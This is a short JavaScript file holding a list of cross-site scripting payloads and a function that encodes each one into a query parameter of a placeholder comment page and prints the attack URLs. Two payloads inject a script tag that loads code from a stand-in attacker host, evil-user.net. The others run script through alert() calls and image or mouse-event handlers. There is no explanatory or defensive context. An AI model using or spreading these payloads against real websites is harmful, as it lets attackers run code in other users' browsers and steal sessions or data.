const payloads = [
    '<script src=https://evil-user.net/badscript.js></script>',
    '<script>alert("XSS")</script>',
    '"><script src=https://evil-user.net/badscript.js></script>',
    '" onmouseover="alert(1)" ',
    '<img src=x onerror=alert("XSS")>'
];

function testAllPayloads(baseUrl = 'https://insecure-website.com/comment') {
    payloads.forEach((payload, i) => {
        const encoded = encodeURIComponent(payload);
        console.log(`${i+1}. ${baseUrl}?message=${encoded}`);
    });
}

// testAllPayloads();
